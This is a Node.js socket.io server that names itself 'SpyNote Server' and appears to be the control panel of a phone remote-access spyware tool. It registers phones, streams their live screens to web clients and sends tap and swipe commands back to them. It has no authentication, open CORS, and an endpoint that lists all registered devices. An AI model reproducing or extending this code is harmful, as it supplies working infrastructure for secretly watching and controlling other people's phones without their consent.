const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

const devices = new Map(); // deviceId -> {info, connected, sockets: []}

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()).map(([id, info]) => [id, info]));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    // ✅ FIXED: Device Registration + Room Management
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            if (!devices.has(deviceId)) {
                devices.set(deviceId, { 
                    ...deviceInfo, 
                    connected: true, 
                    sockets: [] 
                });
            } else {
                devices.get(deviceId).connected = true;
                devices.get(deviceId).sockets = [];
            }
            
            // ✅ Join device room + store socket
            socket.join(deviceId);
            const device = devices.get(deviceId);
            device.sockets.push(socket.id);
            
            console.log(`📱 Device "${deviceId}" registered, sockets: ${device.sockets.length}`);
            io.emit('devices-update', Array.from(devices.entries()).map(([id, info]) => [id, info]));
        }
    });

    // 🔥 FIXED: Screen Frame Broadcast (Phone -> ALL Web Clients)
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId) && devices.get(deviceId).connected) {
            // ✅ Broadcast to ALL clients in device room (NOT just sender)
            socket.to(deviceId).emit('screen-update', data);
            console.log(`📺 Frame ${data.width}x${data.height} -> ${deviceId} (${socket.to(deviceId).length} viewers)`);
        }
    });

    // ✅ Control Commands (Web -> Phone)
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId) && devices.get(deviceId).connected) {
            // ✅ Send to ALL phone sockets (multi-instance support)
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 Control "${action}" -> ${deviceId}`);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Socket disconnected:', socket.id);
        
        // ✅ Update device sockets list
        for (const [deviceId, device] of devices.entries()) {
            device.sockets = device.sockets.filter(id => id !== socket.id);
            
            // If no sockets left OR specific device socket disconnected
            if (device.sockets.length === 0) {
                device.connected = false;
                console.log(`📱 Device "${deviceId}" OFFLINE`);
            }
        }
        
        io.emit('devices-update', Array.from(devices.entries()).map(([id, info]) => [id, info]));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}`);
    console.log(`🌐 Web panel: http://localhost:${PORT}`);
    console.log(`📱 Live screen + controls READY!`);
});
